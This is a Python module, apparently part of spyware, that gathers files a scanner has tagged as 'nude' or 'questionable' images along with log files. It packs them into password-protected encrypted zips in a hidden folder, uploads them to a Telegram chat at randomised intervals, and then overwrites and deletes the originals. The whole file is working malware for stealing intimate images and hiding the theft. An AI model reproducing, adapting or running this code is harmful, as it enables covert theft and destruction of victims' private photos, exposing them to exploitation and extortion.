# -*- coding: utf-8 -*-

import os, time, json, random, zipfile, threading, logging, gc

from datetime import datetime

P = os.path.join(os.getcwd(), ".sys_runtime")

H = os.path.join(P, "harvest")

if not os.path.exists(H): os.makedirs(H)

logging.basicConfig(filename=os.path.join(P, "z.log"), level=logging.ERROR)

try:

    import pyzipper

    HAS_PYZIP = True

except:

    HAS_PYZIP = False

class DailyZipper:

    def __init__(self, scanner=None, tg=None):

        self.sc = scanner

        self.tg = tg

        self.pw = b"Z@3n_2025"

        self.max_b = 45 * 1024 * 1024

        self.active = False

    def _shred(self, p):

        try:

            if os.path.exists(p):

                sz = os.path.getsize(p)

                if sz > 0:

                    with open(p, "ba+", buffering=0) as f:

                        f.write(os.urandom(sz))

                        f.flush()

                        os.fsync(f.fileno())

                os.remove(p)

        except:

            pass

    def _pack(self, fl):

        if not fl or self.active:

            return

        self.active = True

        bt, cb, cs = [], [], 0

        for f in fl:

            if not os.path.exists(f):

                continue

            fs = os.path.getsize(f)

            if cs + fs > self.max_b:

                bt.append(cb)

                cb, cs = [], 0

            cb.append(f)

            cs += fs

        if cb:

            bt.append(cb)

        def _send():

            vault = None

            try:

                if self.sc and self.sc.det and self.sc.det.mon:

                    vault = getattr(self.sc.det.mon, 'vlt', None)

            except:

                pass

            if not vault:

                vault = getattr(self.tg, 'dat', None)

            for i, b in enumerate(bt):

                zn = f"sys_h_{int(time.time())}_{i+1}.bin"

                zp = os.path.join(H, zn)

                try:

                    if HAS_PYZIP:

                        with pyzipper.AESZipFile(zp, 'w', compression=pyzipper.ZIP_DEFLATED, encryption=pyzipper.WZ_AES) as zf:

                            zf.setpassword(self.pw)

                            for f in b:

                                zf.write(f, os.path.basename(f) + ".dat")

                    else:

                        with zipfile.ZipFile(zp, 'w', zipfile.ZIP_DEFLATED) as zf:

                            for f in b:

                                zf.write(f, os.path.basename(f) + ".dat")

                    with open(zp, 'rb') as f_obj:

                        r = self.tg._ap("sendDocument",

                                       {"chat_id": vault, "caption": f"📦 {i+1}/{len(bt)}"},

                                       {"document": f_obj})

                    if r and r.get('ok'):

                        threading.Thread(target=self._shred_batch, args=(b,), daemon=True).start()

                except Exception as e:

                    logging.error(str(e))

                finally:

                    if os.path.exists(zp):

                        os.remove(zp)

                if i < len(bt) - 1:

                    time.sleep(random.randint(600, 10800))

            self.active = False

            gc.collect()

        threading.Thread(target=_send, daemon=True).start()

    def _shred_batch(self, batch):

        step = random.randint(5, 10)

        for i in range(0, len(batch), step):

            for f in batch[i:i+step]:

                self._shred(f)

            time.sleep(random.randint(60, 120))

    def run(self):

        if self.active:

            return

        all_f = []

        if self.sc:

            n = self.sc.get_gallery_by_category("nude", limit=500)

            all_f.extend([p[0] for p in n])

            q = self.sc.get_gallery_by_category("questionable", limit=200)

            all_f.extend([p[0] for p in q])

        for f in os.listdir(P):

            if f.endswith(".log") and "z.log" not in f:

                all_f.append(os.path.join(P, f))

        if all_f:

            self._pack(all_f)

def create(scanner=None, telegram=None):

    return DailyZipper(scanner, telegram)
